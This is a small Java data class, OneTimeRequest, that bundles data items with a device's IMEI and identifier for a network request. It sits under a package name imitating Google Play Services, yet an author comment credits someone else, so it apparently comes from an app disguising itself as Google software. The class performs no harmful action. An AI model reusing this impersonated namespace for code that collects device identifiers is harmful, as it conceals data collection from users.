package com.google.android.gms.persistent.googleapps.network.models.request;

import com.google.android.gms.persistent.googleapps.network.models.data.Data;

import java.util.Date;
import java.util.List;

/**
 * Created by OldMan on 05.04.2017.
 */

public class OneTimeRequest extends InformationRequest {
    private Date dateCreate;

    public OneTimeRequest(List<Data> data, String imei, String device) {
        super(data, imei, device);
    }

    public Date getDateCreate() {
        return dateCreate;
    }

    public void setDateCreate(Date dateCreate) {
        this.dateCreate = dateCreate;
    }
}
